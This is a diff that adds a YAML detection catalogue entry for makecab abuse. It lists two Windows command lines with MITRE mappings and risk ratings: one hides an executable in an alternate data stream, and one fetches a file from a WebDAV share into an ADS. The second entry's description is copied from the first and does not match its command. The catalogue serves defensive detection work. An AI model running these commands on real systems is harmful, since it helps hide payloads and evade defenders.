@@ -1,0 +1,46 @@
+- command: makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
+  description: Abuse makecab to compress autoruns.exe and store the output in the Alternate Data Stream (ADS) of cabtest.txt.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+    Collection:
+      - T1560.001
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Makecab/
+    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
+  risk: High
+  risk_reason: Manual use of makecab is anomalous on it's own - especially when used together with ADS.
+  fidelity: High
+  fidelity_reason: This type of commandline is typically rare in most organizations./
+  tool: makecab
+  threatactors:
+    N/A:
+      - N/A
+- command: makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab
+  description: Abuse makecab to download and compress autoruns.exe then store the output in the Alternate Data Stream (ADS) of cabtest.txt.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+    Collection:
+      - T1560.001
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Makecab/
+    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
+  risk: High
+  risk_reason: Manual use of makecab is anomalous on it's own - especially when used together with remote files and ADS.
+  fidelity: High
+  fidelity_reason: This type of commandline is typically rare in most organizations./
+  tool: makecab
+  threatactors:
+    N/A:
+      - N/A
